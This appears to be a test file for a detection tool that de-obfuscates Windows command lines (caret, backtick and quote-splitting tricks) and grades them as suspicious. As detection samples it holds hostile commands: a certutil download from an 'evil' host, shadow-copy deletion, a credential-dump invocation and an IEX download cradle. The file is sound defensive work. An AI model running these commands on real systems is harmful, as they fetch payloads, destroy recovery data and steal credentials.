import { describe, it, expect } from "vitest";
import { normalizeCommand } from "../../src/analysis/commandNormalize.js";
import { tradecraftSignal } from "../../src/analysis/tradecraftRules.js";
import { reconTechniques } from "../../src/analysis/reconTechniques.js";
import { isSuspiciousCmd } from "../../src/analysis/siemImport.js";

describe("normalizeCommand — cmd caret escapes", () => {
  it("strips carets so a caret-split binary name matches", () => {
    const r = normalizeCommand("c^m^d /c who^ami");
    expect(r.text).toBe("cmd /c whoami");
    expect(r.tricks).toContain("caret");
    expect(r.changed).toBe(true);
  });

  it("collapses a doubled caret to the literal caret it represents", () => {
    const r = normalizeCommand("echo a^^b");
    expect(r.text).toBe("echo a^b");
  });

  it("leaves a caret that escapes nothing alone", () => {
    const r = normalizeCommand("echo done^");
    expect(r.text).toBe("echo done^");
    expect(r.changed).toBe(false);
  });
});

describe("normalizeCommand — PowerShell backtick escapes", () => {
  it("strips backticks so a backtick-split flag matches", () => {
    const r = normalizeCommand("p`o`w`ershell -e`n`c ABCD");
    expect(r.text).toBe("powershell -enc ABCD");
    expect(r.tricks).toContain("backtick");
  });

  // Backtick-n is a NEWLINE only inside double quotes. Outside them it escapes a literal "n",
  // which is exactly what `-e`n`c` relies on — so the two cases must not share a rule.
  it("treats a backtick escape inside double quotes as whitespace", () => {
    const r = normalizeCommand('echo "a`nb"');
    expect(r.text).toBe('echo "a b"');
  });

  it("treats the same escape outside quotes as its literal letter", () => {
    const r = normalizeCommand("echo a`nb");
    expect(r.text).toBe("echo anb");
  });

  // Single quotes are literal in PowerShell — a backtick inside them escapes nothing.
  it("leaves a backtick inside single quotes alone", () => {
    const raw = "echo 'a`nb'";
    expect(normalizeCommand(raw).text).toBe(raw);
  });

  it("turns an escaped space into a real space", () => {
    const r = normalizeCommand("cd C:\\Program` Files");
    expect(r.text).toBe("cd C:\\Program Files");
  });
});

describe("normalizeCommand — string splitting", () => {
  it("joins a quoted concatenation", () => {
    const r = normalizeCommand('"po"+"wer"+"shell" -nop');
    expect(r.text).toBe("powershell -nop");
    expect(r.tricks).toContain("concat");
  });

  it("joins single-quoted concatenation with surrounding spaces", () => {
    const r = normalizeCommand("'IE'  +  'X' $payload");
    expect(r.text).toBe("IEX $payload");
  });

  it("removes an empty quote pair used to break a token", () => {
    const r = normalizeCommand('pow""ershell -enc ABCD');
    expect(r.text).toBe("powershell -enc ABCD");
    expect(r.tricks).toContain("empty-quote");
  });
});

describe("normalizeCommand — leaves legitimate commands alone", () => {
  it("keeps a quoted path containing spaces intact", () => {
    const raw = 'robocopy "C:\\Program Files\\App" D:\\backup /MIR';
    const r = normalizeCommand(raw);
    expect(r.text).toBe(raw);
    expect(r.changed).toBe(false);
    expect(r.tricks).toEqual([]);
  });

  it("reports no change for an ordinary command line", () => {
    const raw = "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1";
    const r = normalizeCommand(raw);
    expect(r.text).toBe(raw);
    expect(r.changed).toBe(false);
  });

  it("does not treat an arithmetic plus between bare words as concatenation", () => {
    const raw = "calc 2 + 2";
    expect(normalizeCommand(raw).text).toBe(raw);
  });
});

describe("normalizeCommand — bounds", () => {
  it("returns oversized input unchanged rather than scanning it", () => {
    const raw = "c^md ".repeat(5000);
    const r = normalizeCommand(raw);
    expect(r.text).toBe(raw);
    expect(r.changed).toBe(false);
    expect(r.truncated).toBe(true);
  });

  it("handles empty input", () => {
    const r = normalizeCommand("");
    expect(r.text).toBe("");
    expect(r.changed).toBe(false);
  });
});

describe("wired into the command matchers", () => {
  it("grades a caret-escaped shadow-copy deletion the same as the plain form", () => {
    const plain = tradecraftSignal("", "vssadmin delete shadows /all /quiet");
    const escaped = tradecraftSignal("", "vssadmin de^lete shadows /all /quiet");
    expect(plain?.weight).toBe("strong");
    expect(escaped?.weight).toBe("strong");
    expect(escaped?.mitre).toEqual(plain?.mitre);
  });

  it("recognises a caret-escaped certutil download", () => {
    expect(reconTechniques("", "c^e^r^t^u^t^i^l -urlcache -f http://evil/x.exe")).toContain("T1105");
  });

  it("grades a backtick-escaped encoded PowerShell command", () => {
    expect(isSuspiciousCmd("powershell.exe", "-e`n`c SQBFAFgAIAAoAA==")).toBe("weak");
  });

  it("grades a caret-escaped credential dump as strongly as the plain form", () => {
    expect(isSuspiciousCmd("", "se^ku^rlsa::logonpasswords")).toBe("strong");
  });

  it("recognises a concatenated IEX download cradle", () => {
    expect(isSuspiciousCmd("", "'IE'+'X' (New-Object Net.WebClient).DownloadString('http://x')")).toBe(
      "weak",
    );
  });

  // The whole point of matching the original first: nothing that fired before may stop firing.
  it("still grades unescaped commands exactly as before", () => {
    expect(isSuspiciousCmd("", "certutil -urlcache -f http://evil/x.exe")).toBe("weak");
    expect(tradecraftSignal("", "vssadmin delete shadows")?.mitre).toContain("T1490");
    expect(reconTechniques("", "certutil -urlcache -f http://x")).toContain("T1105");
  });

  it("does not invent a match across the original/normalized seam", () => {
    // "…de" ends the original and "lete shadows…" would start the normalized copy. Joined without
    // a separator those two halves would splice into a "delete shadows" nobody typed.
    expect(tradecraftSignal("", "harmless de^scription of a backup policy")).toBeNull();
  });

  it("leaves an ordinary admin command ungraded", () => {
    expect(isSuspiciousCmd("", 'robocopy "C:\\Program Files\\App" D:\\backup /MIR')).toBeNull();
  });
});
